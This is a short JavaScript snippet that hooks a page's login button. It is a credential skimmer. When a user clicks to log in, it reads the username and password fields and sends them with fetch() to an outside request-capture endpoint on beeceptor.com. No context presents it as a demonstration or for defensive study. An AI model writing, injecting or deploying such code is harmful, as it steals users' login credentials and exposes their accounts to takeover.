const button = document.querySelector('.loginSubmit');

button.addEventListener('click', () => {
  const idField = document.querySelector('[name="userName"]');
  const id = idField.value;
  const passField = document.querySelector('[name="pass"]');
  const pass = passField.value;
  fetch('https://sdsdf.free.beeceptor.com'+id+':'+pass);
});
